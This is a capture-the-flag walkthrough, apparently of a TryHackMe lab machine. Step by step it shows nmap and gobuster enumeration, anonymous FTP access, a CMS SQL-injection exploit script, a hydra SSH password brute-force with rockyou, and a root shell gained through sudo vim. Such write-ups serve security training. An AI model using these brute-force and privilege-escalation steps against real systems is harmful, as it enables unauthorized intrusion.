# Simple CTF Walkthrough

## Outline

* nmap to discover ports and services
* ftp to check for anonymous login and files
* gobuster to find directories on port 80
* searching for exploit on google
* gaining username and password for ssh
* ssh login
* privilege escalation

## nmap
We will use nmap Aggressive Scan to search for ports and services.

`nmap -A IP-Address`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 11:48 EDT
Nmap scan report for 10.10.175.151
Host is up (0.20s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.13.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds
```

## FTP

nmap scan shows that anonymous login is allowed on ftp.

so we login inside ftp using anonymous access and search for files.

```
kali@kali:~$ ftp
ftp> o
(to) 10.10.175.151
Connected to 10.10.175.151.
220 (vsFTPd 3.0.3)
Name (10.10.175.151:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> lcd tryhackme/easy/simple/
Local directory now /home/kali/tryhackme/easy/simple
ftp> mget *
mget ForMitch.txt? yes
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (412.4921 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp>
```
we get pub directory inside which there is ForMitch.txt.

so we download the file on our machine.

`get ForMitch.txt` or simply `mget *`

once it is downloaded lets read the file.

`cat For Mitch.txt`

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

This also tells us that there is a user ``` mitch ```

## Accessing Port 80

we saw port 80 open so we access it on the browser.

we get apache default page.

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_00_44](https://user-images.githubusercontent.com/25170472/92245133-871b7f80-eee1-11ea-9d23-f5baf7b69394.png)


## gobuster

we will use gobuster to search for directories.

`gobuster dir -u http://10.10.175.151/ -w /usr/share/wordlists/dirb/common.txt`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.175.151/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/04 11:52:40 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/09/04 11:54:13 Finished
===============================================================
```

the output from gobuster shows us that there are two interesting things:-

* /robots.txt
* /simple

## Accessing /robots.txt

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_01_33](https://user-images.githubusercontent.com/25170472/92245232-a9150200-eee1-11ea-912b-505f6948e444.png)

here we get /opememr-5_0_1_3.

This also tells us that there is a user ``` mike ```

## Accessing /opememr-5_0_1_3

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_04_23](https://user-images.githubusercontent.com/25170472/92245363-e8dbe980-eee1-11ea-9096-5ad8b59fcfdf.png)

Page note found.

This was a rabbit hole.

## Accessing /simple

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_05_23](https://user-images.githubusercontent.com/25170472/92245615-3fe1be80-eee2-11ea-8862-30bee3e4bcc2.png)

here we get a CMS and its login page.

CMS name is Simple CMS.

## Exploit

So searching an exploit for Simple CMS on Google we get this exploit.

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_08_34](https://user-images.githubusercontent.com/25170472/92245978-c1395100-eee2-11ea-9f99-820bce857cac.png)

copy and save it on your machine. (in my case I saved it as exploit.py)

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_09_24](https://user-images.githubusercontent.com/25170472/92246082-e037e300-eee2-11ea-89b8-8dc11713af9a.png)

Save the two names mike and mitch in a file.

I used nano to create a file named users and saved the two names in it. 


![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_53_37](https://user-images.githubusercontent.com/25170472/92246898-05792100-eee4-11ea-94f9-bc1514e4d67a.png)

lets run the script.

`python exploit.py -u http://IP-Address/simple/ --crack -w user`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 16_41_32](https://user-images.githubusercontent.com/25170472/92246493-74a24580-eee3-11ea-863f-abb74957e376.png)

though the script gave an output, I was not able to get the password.

In case you face the same issue you can switch to hydra to crack the pass.

`hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.175.151 ssh`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_01_31](https://user-images.githubusercontent.com/25170472/92247104-5ee15000-eee4-11ea-9dba-256fa96f1aad.png)

using hydra we got the password for the username mitch.

# User Access

## ssh login

lets login into ssh with the creds that we got.


`ssh mitch@IP -p 2222`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_02_03](https://user-images.githubusercontent.com/25170472/92247206-8506f000-eee4-11ea-9c0e-1a6145a3a2be.png)

we successfully logged in as mitch.

you will get the user flag in the current directory.

`ls -al`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_02_12](https://user-images.githubusercontent.com/25170472/92247332-b54e8e80-eee4-11ea-91bc-2d74867b5b8e.png)

# Privilege Escalation

To escalate privileges we start with sudo -l command.

`sudo -l`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_02_51](https://user-images.githubusercontent.com/25170472/92247756-458cd380-eee5-11ea-9676-770b7acb79d2.png)

as we can see the user mitch has the permission to use vim as root without using password.

use this command for privesc.

`sudo /usr/bin/vim`

`:!sh`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_03_34](https://user-images.githubusercontent.com/25170472/92247871-75d47200-eee5-11ea-9d54-088f43f86d1e.png)

WE GOT THE ROOT ACCESS!!!!

If you are not familiar with vim exploit you can search for gtfobins on google and search for command there.

you can find the root flag in /root folder

`cd /root`

`ls -al`

![kali-linux-2020 2a-vbox-amd64 - VMware Workstation 04-09-2020 17_04_46](https://user-images.githubusercontent.com/25170472/92247930-93094080-eee5-11ea-90a8-8ce18ad02085.png)


# Summary

* we used nmap for getting ports and services.
* we accessed ftp anonymous login to get ForMitch.txt from which we got username mitch.
* we used gobuster to search for directories from which we got /robots.txt and /simple .
* from /robots.txt we got username mike and /opememr-5_0_1_3.
* /opememr-5_0_1_3 was a rabbit hole.
* from /simple we came to know which CMS is used.
* we googled for exploit and got sqli exploit for simple cms.
* we got the username and password for ssh
* we used vim for privilege escalation
